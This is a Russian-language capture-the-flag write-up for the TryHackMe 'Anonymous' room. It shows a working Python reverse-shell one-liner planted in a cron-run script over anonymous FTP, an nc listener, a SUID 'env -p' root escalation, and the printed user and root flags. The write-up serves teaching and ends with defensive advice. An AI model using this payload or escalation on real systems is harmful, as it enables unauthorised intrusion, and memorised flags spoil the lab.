# Anonymous

**Сложность:** Medium

<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/74644a95-ff89-45fe-b81a-408d26e2ee0d" />


| | |
|---|---|
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/anonymous |
| **ОС** | Linux |
| **Теги** | `ftp`, `smb`, `privesc`, `env` |

## Кратко

Машина с открытыми FTP, SSH и Samba. Анонимный доступ к FTP позволяет перезаписать скрипт `clean.sh`, запускаемый по расписанию, на reverse shell — так получаем пользователя. Повышение привилегий — через SUID-бит на `/usr/bin/env` с флагом `-p`.

## 1. Разведка

### Сканирование портов

```bash
nmap -sV 10.80.137.254
```

```
Отчет о сканировании Nmap для 10.80.137.254
Хост активен (задержка 0.048s).
Не показано: 996 закрытых tcp-портов (reset)
ПОРТ    СОСТОЯНИЕ СЕРВИС      ВЕРСИЯ
21/tcp  открыт    ftp         vsftpd 2.0.8 или новее
22/tcp  открыт    ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp открыт    netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp открыт    netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Информация о хосте: ANONYMOUS; ОС: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открытые порты:
- **21/tcp** — FTP (vsftpd)
- **22/tcp** — SSH (OpenSSH)
- **139/tcp** — Samba
- **445/tcp** — Samba

### Исследование SMB

Проверяем доступные шары:

```bash
smbclient -L //10.80.137.254
```

В шаре `pics` обнаружены две картинки с корги. Метаданные, стегоанализ и структура файлов ничего полезного не дали.

### Исследование FTP

Подключаемся к FTP-серверу под анонимным пользователем:

```bash
ftp 10.80.137.254
ftp> user anonymous
```

В папке `scripts` обнаружены три файла:
- `removed_files.log`
- `to_do.txt`
- `clean.sh`

Анализ файлов:
- **removed_files.log** — множество записей о том, что нечего удалять, что указывает на выполнение скрипта по расписанию (cron).
- **to_do.txt** — заметка о необходимости отключить анонимный вход на FTP.
- **clean.sh** — скрипт очистки файлов; права доступа позволяют всем пользователям читать, записывать и выполнять этот файл.

## 2. Получение доступа

Поскольку есть права на запись в директорию `scripts`, заменяем `clean.sh` на reverse shell.

Скачиваем оригинальный файл:

```bash
ftp> get clean.sh
```

Готовим полезную нагрузку (bash и nc не сработали, использован Python):

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.129.112",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

Загружаем измененный файл обратно:

```bash
ftp> put clean.sh
```

Запускаем листенер:

```bash
nc -lnvp 4444
```

Через минуту скрипт выполняется по расписанию и прилетает шелл:

```bash
namelessone@anonymous:~$ ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

**Флаг пользователя:** `90d6f992585815ff991e68748c414740`

## 3. Повышение привилегий

Ищем SUID-файлы:

```bash
find / -perm -4000 2>/dev/null
```

Среди стандартных SUID-файлов выделяется `/usr/bin/env`.

Попытка через `sudo` требует пароль, которого нет:

```bash
env /bin/sh
sudo env /bin/sh
```

```
[sudo] password for namelessone:
sudo: 3 incorrect password attempts
```

Обходим ограничение, запуская `env` напрямую с флагом `-p`, который отключает сброс привилегий и сохраняет SUID-права:

```bash
env /bin/bash -p
```

```bash
bash-4.4# whoami
root
```

Читаем root-флаг:

```bash
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
4d930091c31a622a7ed10f27999af363
```

**Флаг root:** `4d930091c31a622a7ed10f27999af363`

## Выводы

- Анонимный доступ к FTP с правом записи в директорию, которую периодически исполняет cron, — прямой путь к RCE: достаточно подменить исполняемый скрипт.
- SUID-бит на `/usr/bin/env` без ограничений позволяет тривиально повысить привилегии через `env /bin/bash -p` — флаг `-p` сохраняет эффективный UID вместо его сброса.
- Для защиты: отключить анонимный вход на FTP, убрать права на запись для посторонних пользователей, снять лишний SUID с `env`.

## Использованные инструменты

`nmap`, `smbclient`, `ftp`, `nc`, Python
